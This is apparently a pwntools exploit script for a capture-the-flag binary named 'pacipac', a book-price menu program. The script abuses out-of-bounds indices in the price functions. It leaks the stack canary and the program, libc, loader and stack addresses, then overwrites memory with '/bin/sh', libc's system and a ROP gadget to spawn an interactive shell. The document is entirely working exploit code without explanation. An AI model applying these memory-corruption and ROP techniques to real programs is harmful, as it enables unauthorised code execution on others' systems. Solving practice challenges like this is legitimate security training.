from pwn import *
from icecream import ic

elf = exe = ELF("./pacipac_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x000000000000185f
pie b 0x00000000000018f6
pie b 0x0000000000001ac9
b *leave_function
b *verify_pointer
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def get_price(ind):
    sla(b">", b"1")
    sla(b"Enter your book idx: ", str(ind).encode())
    ru("is ")
    return int(rl().strip().decode())

def set_price(ind, price):
    sla(b">", b"2")
    sla(b"Enter your book idx: ", str(ind).encode())
    sla(b"Enter price: ", str(price).encode())

def add_book(ind, name):
    sla(b">", b"3")
    sla(b"Enter book idx: ", str(ind).encode())
    sla(b"Enter book: ", name)

def delete_book(ind):
    sla(b">", b"4")
    sla(b"Enter book idx: ", str(ind).encode())

canary = get_price(21)
elf.address = get_price(25) - 0x1682
libc.address = get_price(43) - 0x29e40
ld.address = get_price(33) - 0x3a040
stack_address = get_price(27) - 0x188

ic(hex(canary))
ic(hex(elf.address))
ic(hex(libc.address))
ic(hex(ld.address))
ic(hex(stack_address))
# 0xebc81 0xebc85 0xebc88 0xebce2 0xebd38 0xebd3f 0xebd43
set_price(8, 0x68732F6E69622F)
set_price(-3, libc.sym['system'])
set_price(-4, stack_address)
set_price(-5, libc.address+0x000000000002a3e5)

io.interactive()
